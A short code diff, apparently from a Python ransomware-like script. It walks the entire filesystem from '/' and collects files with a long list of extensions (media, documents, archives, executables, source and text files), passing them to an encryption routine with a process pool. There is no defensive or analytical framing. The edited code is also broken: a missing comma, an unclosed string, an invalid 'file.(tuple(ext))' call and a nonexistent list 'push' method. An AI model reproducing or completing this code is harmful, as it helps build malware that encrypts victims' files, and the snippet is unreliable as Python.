@@ -72,10 +72,17 @@ def single_arg_encrypt_file(in_filename):
     encrypt_file(key, in_filename)
 
 def selectfiles():
+    
+    ext = [".3g2", ".3gp", ".asf", ".asx", ".avi", ".flv", 
+           ".m2ts", ".mkv", ".mov", ".mp4", ".mpg", ".mpeg",
+           ".rm", ".swf", ".vob", ".wmv" ".docx", ".pdf",".rar",
+           ".jpg",".jpeg",".png", ".tiff", ".zip", ".7z", ".exe", 
+           ".tar.gz", "tar", ".mp3", ".sh", ".c", ".h", ".txt]
+           
     files_to_enc = []
     for root, dirs, files in os.walk("/"):
         for file in files:
-            if file.endswith(".docx",".pdf",".rar",".jpg",".jpeg",".png",".tiff",".zip",".7z",".exe",".mp3",""):
+            if file.(tuple(ext)):
                 files_to_enc.push(os.path.join(root, file))
 
     pool = Pool(processes=4)
